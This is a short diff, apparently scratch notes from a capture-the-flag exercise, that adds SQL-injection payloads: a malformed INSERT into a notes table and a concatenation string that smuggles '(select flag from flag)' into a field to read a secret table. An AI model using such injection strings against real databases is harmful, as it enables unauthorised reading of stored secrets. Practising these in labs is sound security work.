@@ -1,0 +1,6 @@
+INSERT INTO notes(username, notes)
+VALUES 
+('some sesssopn value','aa' (select flag from flag) 'a')
+
+
+aa' || (select flag from flag) || 'aa
